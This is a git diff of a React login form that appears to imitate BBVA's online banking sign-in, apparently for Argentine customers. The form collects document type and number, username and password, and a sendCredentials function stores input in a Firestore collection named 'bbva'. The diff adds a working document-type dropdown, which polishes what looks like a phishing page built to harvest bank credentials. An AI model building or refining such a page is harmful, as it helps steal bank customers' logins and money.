@@ -12,12 +12,25 @@ const keyboard = <FontAwesomeIcon icon={faKeyboard} />;
 const collection = firebase.firestore().collection("bbva"); 
 
 const Forms = () => {
+    
+    var state = {
+        open: false,
+    };
 
     const [documentTypeVal, setDocumentType] = React.useState("DNI");
     const [documentVal, setDocument] = React.useState(null);
     const [usernameVal, setUsername] = React.useState(null);
     const [passwordVal, setPassword] = React.useState(null);
     const [passwordShown, setPasswordShown] = React.useState(false);
+    const [dropdownVisibility, setDropdownVisibility] = React.useState({ open: false });
+
+    const handleButtonClick = () => {
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
+    };
 
     const handleChangeDocumentType = (event) => {
         setDocumentType(event.target.value);
@@ -39,6 +52,66 @@ const Forms = () => {
 
     const togglePasswordVisiblity = () => {
         setPasswordShown(passwordShown ? false : true);
+    };
+    
+    const handleDniClick = () => {
+
+        setDocumentType("DNI");
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
+    };
+    
+    const handleLcClick = () => {
+
+        setDocumentType("LC");
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
+    };
+    
+    const handleLeClick = () => {
+
+        setDocumentType("LE");
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
+    };
+    
+    const handleCiClick = () => {
+
+        setDocumentType("CI");
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
+    };
+    
+    const handlePasaporteClick = () => {
+
+        setDocumentType("PASAPORTE");
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
+    };
+    
+    const handleRenaperClick = () => {
+
+        setDocumentType("RENAPER");
+        setDropdownVisibility((state) => {
+            return {
+                open: !state.open,
+            };
+        });
     };
 
     const sendCredentials = async () =>{
@@ -146,6 +219,7 @@ const Forms = () => {
                                 id="documentOptions"
                                 type="button"
                                 className="button-select"
+                                onClick={handleButtonClick}
                                 value={documentTypeVal}
                                 style={{
                                     borderTop:"transparent",
@@ -155,7 +229,7 @@ const Forms = () => {
                                     color:"#121212",
                                     cursor:"pointer",
                                     fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                    fontWeight:"350",
+                                    fontWeight:"300",
                                     textAlign:"left",
                                     position:"relative",
                                     lineHeight:"24px",
@@ -167,71 +241,82 @@ const Forms = () => {
                                 }}>
                                 
                             </input>
-                            <div>
-                                <ul
-                                    className="options-list"
-                                    style={{
-                                        background:"#fff",
-                                        border:"1px solid #e6e5e5",
-                                        borderTop:0,
-                                        borderBottom:0,
-                                        color:"#1f1f1f",
-                                        maxHeight:0,
-                                        opacity:1,
-                                        overflow:"hidden",
-                                        position:"relative",
-                                        top:"0",
-                                        width:"100%",
-                                        zIndex:"12",
-                                        boxSizing:"border-box",
-                                        WebkitAppearance:"none",
-                                        display:"block",
-                                        paddingInlineStart:"40px"
-                                    }}>
-                                    <li
+                            {dropdownVisibility.open && (
+                                <div>
+                                    <ul
+                                        className="options-list"
                                         style={{
-                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                            fontWeight:"350",
+                                            background:"#fff",
+                                            border:"1px solid #e6e5e5",
+                                            borderTop:0,
+                                            borderBottom:0,
+                                            color:"#1f1f1f",
+                                            margin:0,
+                                            opacity:1,
+                                            position:"relative",
+                                            top:"0",
+                                            width:"100%",
+                                            zIndex:"12",
+                                            boxSizing:"border-box",
+                                            display:"block"
                                         }}>
-                                        DNI
-                                    </li>
-                                    <li
-                                        style={{
-                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                            fontWeight:"350",
-                                        }}>
-                                        LC
-                                    </li>
-                                    <li
-                                        style={{
-                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                            fontWeight:"350",
-                                        }}>
-                                        LE
-                                    </li>
-                                    <li
-                                        style={{
-                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                            fontWeight:"350",
-                                        }}>
-                                        CI
-                                    </li>
-                                    <li
-                                        style={{
-                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                            fontWeight:"350",
-                                        }}>
-                                        PASAPORTE
-                                    </li>
-                                    <li
-                                        style={{
-                                            fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
-                                            fontWeight:"350",
-                                        }}>
-                                        RENAPER
-                                    </li>
-                                </ul>
-                            </div>
+                                        <li
+                                            onClick={handleDniClick}
+                                            className="options-li"
+                                            style={{
+                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                                fontWeight:"350"
+                                            }}>
+                                            DNI
+                                        </li>
+                                        <li
+                                            onClick={handleLcClick}
+                                            className="options-li"
+                                            style={{
+                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                                fontWeight:"350"
+                                            }}>
+                                            LC
+                                        </li>
+                                        <li
+                                            onClick={handleLeClick}
+                                            className="options-li"
+                                            style={{
+                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                                fontWeight:"350"
+                                            }}>
+                                            LE
+                                        </li>
+                                        <li
+                                            onClick={handleCiClick}
+                                            className="options-li"
+                                            style={{
+                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                                fontWeight:"350"
+                                            }}>
+                                            CI
+                                        </li>
+                                        <li
+                                            onClick={handlePasaporteClick}
+                                            className="options-li"
+                                            style={{
+                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                                fontWeight:"350"
+                                            }}>
+                                            PASAPORTE
+                                        </li>
+                                        <li
+                                            onClick={handleRenaperClick}
+                                            className="options-li"
+                                            style={{
+                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
+                                                fontWeight:"350"
+                                            }}>
+                                            RENAPER
+                                        </li>
+                                    </ul>
+                                </div>
+                            )}
                         </div>
                         <div
                             className="form-group"
